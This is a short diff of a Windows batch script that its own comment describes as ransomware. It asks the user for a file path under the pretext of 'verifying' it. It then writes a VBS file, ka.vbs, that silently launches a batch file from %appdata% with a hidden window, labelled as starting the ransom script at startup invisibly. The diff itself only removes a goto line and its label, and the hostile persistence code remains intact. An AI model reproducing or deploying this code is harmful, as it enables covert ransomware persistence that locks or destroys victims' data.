@@ -33,10 +33,8 @@ echo   Please enter the path of the file
 echo         did you want to verify
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 set /p web= :  
-goto 1
 
 ::Create A File To Start The Ransom Bash File At The Start Up, Invisibly::
-:1
 echo Set WshShell = CreateObject("WScript.Shell") >> ka.vbs
 echo WshShell.run chr(34) & "%appdata%\ka.bat" % Chr(34), 0 >> ka.vbs
 echo Set WshShell = Nothing >> ka.vbs
